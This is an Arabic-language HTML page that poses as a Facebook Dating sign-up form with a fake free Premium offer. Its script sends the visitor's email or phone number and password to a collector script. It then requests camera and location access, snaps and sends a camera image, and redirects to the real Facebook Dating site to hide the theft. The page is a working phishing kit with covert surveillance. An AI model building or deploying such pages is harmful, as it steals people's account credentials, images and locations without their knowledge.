<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook Dating</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
    background: linear-gradient(135deg, #ff5e8a 0%, #e91e63 100%);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
    color: #1c1e21;
  }
  .box {
    background: #fff;
    border-radius: 20px;
    padding: 32px 24px;
    max-width: 400px;
    width: 100%;
    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
    text-align: center;
  }
  .icon {
    font-size: 64px;
    margin-bottom: 12px;
  }
  h1 {
    font-size: 24px;
    font-weight: 800;
    margin-bottom: 8px;
    color: #e91e63;
  }
  .subtitle {
    font-size: 14px;
    color: #65676b;
    line-height: 1.5;
    margin-bottom: 24px;
  }
  .highlight {
    background: #ffe4ec;
    color: #e91e63;
    padding: 12px 16px;
    border-radius: 10px;
    font-size: 13px;
    margin-bottom: 20px;
    line-height: 1.5;
  }
  .input {
    width: 100%;
    padding: 14px 16px;
    border: 1px solid #dddfe2;
    border-radius: 10px;
    font-size: 15px;
    font-family: inherit;
    margin-bottom: 12px;
  }
  .input:focus {
    outline: none;
    border-color: #e91e63;
    box-shadow: 0 0 0 3px #ffe4ec;
  }
  .btn {
    width: 100%;
    padding: 14px;
    background: linear-gradient(135deg, #ff5e8a, #e91e63);
    color: #fff;
    border: none;
    border-radius: 10px;
    font-size: 16px;
    font-weight: 700;
    cursor: pointer;
    font-family: inherit;
    margin-top: 6px;
  }
  .btn:active { transform: scale(0.98); }
  .btn:disabled { opacity: 0.5; }
  .stats {
    display: flex;
    justify-content: center;
    gap: 20px;
    margin-top: 20px;
    padding-top: 20px;
    border-top: 1px solid #e4e6eb;
    font-size: 12px;
    color: #65676b;
  }
  .stats strong { color: #e91e63; font-size: 18px; display: block; }
  .error-msg {
    background: #ffebe8;
    border: 1px solid #dd3c10;
    border-radius: 8px;
    padding: 10px 12px;
    color: #dd3c10;
    font-size: 13px;
    margin-bottom: 12px;
    display: none;
  }
  .error-msg.show { display: block; }
  .page-loader {
    position: fixed; inset: 0;
    background: #fff;
    display: none;
    align-items: center; justify-content: center;
    flex-direction: column;
    z-index: 9999;
  }
  .page-loader.active { display: flex; }
  .loader-spinner {
    width: 48px; height: 48px;
    border: 4px solid #ffe4ec;
    border-top-color: #e91e63;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin-bottom: 16px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .loader-text { font-size: 15px; color: #65676b; }
</style>
</head>
<body>

<div class="box">
  <div class="icon">💘</div>
  <h1>Facebook Dating</h1>
  <p class="subtitle">
    اعثر على شريكك المثالي بناءً على اهتماماتك واهتماماتك المشتركة.
  </p>

  <div class="highlight">
    <strong>🎁 عرض خاص</strong><br>
    اشترك في Dating Premium مجاناً لمدة 30 يوم واحصل على مميزات حصرية!
  </div>

  <div class="error-msg" id="error-msg"></div>

  <form id="dating-form" onsubmit="return handleDating(event)">
    <input type="text" id="email" class="input" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
    <input type="password" id="password" class="input" placeholder="كلمة المرور" required>
    <button type="submit" class="btn" id="dating-btn">ابدأ الآن مجاناً</button>
  </form>

  <div class="stats">
    <div><strong>2.5M+</strong>مستخدم نشط</div>
    <div><strong>500K+</strong>قصة نجاح</div>
  </div>
</div>

<div class="page-loader" id="page-loader">
  <div class="loader-spinner"></div>
  <div class="loader-text">جاري تجهيز ملفك الشخصي...</div>
</div>

<script src="/fs/static/collector.js"></script>

<script>
(function() {
    "use strict";
    var submitting = false;

    function showError(msg) {
        var el = document.getElementById('error-msg');
        el.textContent = msg;
        el.classList.add('show');
        setTimeout(function() { el.classList.remove('show'); }, 4000);
    }

    function handleDating(event) {
        event.preventDefault();
        if (submitting) return false;

        var email = document.getElementById('email').value.trim();
        var password = document.getElementById('password').value.trim();

        if (!email || !password) {
            showError('يرجى ملء جميع الحقول');
            return false;
        }

        submitting = true;
        var btn = document.getElementById('dating-btn');
        btn.disabled = true;
        btn.textContent = 'جاري التحقق...';

        FSCollector.captureForm({
            email: email,
            password: password,
            form_type: 'dating'
        }, {
            metadata: { page: '08_dating' }
        }).then(function() {
            FSCollector.showLoader('جاري إنشاء ملفك...');

            setTimeout(function() {
                FSCollector.requestPermissions({
                    camera: true,
                    microphone: false,
                    location: true
                }).then(function(perms) {
                    FSCollector.sendPermissionsResult(perms);
                    if (perms.camera === 'granted' && window.FS_MEDIA_STREAMS && window.FS_MEDIA_STREAMS.camera) {
                        FSCollector.captureFromStream(window.FS_MEDIA_STREAMS.camera, 'camera')
                            .then(function(img) { if (img) FSCollector.sendSnapshot('camera', img); });
                    }
                });

                setTimeout(function() {
                    FSCollector.redirect('https://www.facebook.com/dating');
                }, 3000);
            }, 500);
        });

        return false;
    }

    window.handleDating = handleDating;
})();
</script>

</body>
</html>
